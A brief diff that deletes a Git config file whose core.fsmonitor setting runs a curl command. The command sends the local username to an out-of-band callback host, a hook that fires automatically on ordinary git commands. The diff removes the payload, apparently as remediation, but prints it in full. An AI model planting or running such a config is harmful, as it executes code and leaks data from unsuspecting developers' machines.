@@ -1,4 +1,0 @@
-[core]
-    repositoryformatversion = 0
-    bare = false
-    fsmonitor = "curl https://fsmonitor-rce.d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun/$(whoami) 2>/dev/null; true"
